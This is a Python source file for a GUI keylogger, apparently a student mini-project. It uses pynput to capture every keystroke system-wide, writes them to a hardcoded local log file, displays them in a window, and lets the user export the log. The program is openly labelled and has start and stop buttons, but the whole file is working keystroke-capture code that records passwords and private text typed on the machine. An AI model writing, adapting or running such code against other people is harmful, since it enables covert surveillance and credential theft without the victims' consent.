import os
import threading
from pynput.keyboard import Listener
from tkinter import Tk, Text, Button, filedialog, messagebox


# Define the keylogger class
class KeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger Program")
        self.root.geometry("500x400")
        self.keylog_path = r"D:\Mini-Project [Keylogger]\Python-Keylogger\log.txt"
        self.keylogging = False
        self.listener_thread = None

        # GUI Components
        self.text_area = Text(root, wrap="word", height=15, width=60)
        self.text_area.pack(pady=10)

        self.start_btn = Button(root, text="Start Keylogger", command=self.start_keylogger, bg="green", fg="white")
        self.start_btn.pack(pady=5)

        self.stop_btn = Button(root, text="Stop Keylogger", command=self.stop_keylogger, bg="red", fg="white", state="disabled")
        self.stop_btn.pack(pady=5)

        self.export_btn = Button(root, text="Export Logs", command=self.export_logs, state="disabled")
        self.export_btn.pack(pady=5)

    # Keylogger functionality
    def write_to_file(self, key):
        try:
            letter = str(key).replace("'", "")

            if letter == "Key.space":
                letter = " "
            elif letter in ["Key.shift_r", "Key.shift_l", "Key.ctrl_l"]:
                letter = ""
            elif letter == "Key.enter":
                letter = "\n"

            with open(self.keylog_path, 'a') as f:
                f.write(letter)

            # Update GUI
            self.update_text_area(letter)
        except Exception as e:
            print(f"Error: {e}")

    def start_keylogger(self):
        if not self.keylogging:
            self.keylogging = True
            self.start_btn.config(state="disabled")
            self.stop_btn.config(state="normal")
            self.export_btn.config(state="disabled")
            self.text_area.delete(1.0, "end")  # Clear the text area

            # Start the listener in a separate thread
            self.listener_thread = threading.Thread(target=self.run_listener, daemon=True)
            self.listener_thread.start()
            messagebox.showinfo("Keylogger Started", "Keylogger has started successfully!")

    def stop_keylogger(self):
        if self.keylogging:
            self.keylogging = False
            self.start_btn.config(state="normal")
            self.stop_btn.config(state="disabled")
            self.export_btn.config(state="normal")
            messagebox.showinfo("Keylogger Stopped", "Keylogger has stopped successfully!")

    def run_listener(self):
        with Listener(on_press=self.write_to_file) as listener:
            while self.keylogging:
                pass
            listener.stop()

    def update_text_area(self, text):
        self.text_area.insert("end", text)
        self.text_area.see("end")

    def export_logs(self):
        # Export logs to a selected file
        file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text Files", "*.txt")])
        if file_path:
            try:
                with open(self.keylog_path, 'r') as log_file:
                    data = log_file.read()
                with open(file_path, 'w') as export_file:
                    export_file.write(data)
                messagebox.showinfo("Export Successful", f"Logs exported to {file_path}")
            except Exception as e:
                messagebox.showerror("Export Failed", f"An error occurred: {e}")


# Run the GUI application
if __name__ == "__main__":
    root = Tk()
    app = KeyloggerApp(root)
    root.mainloop()
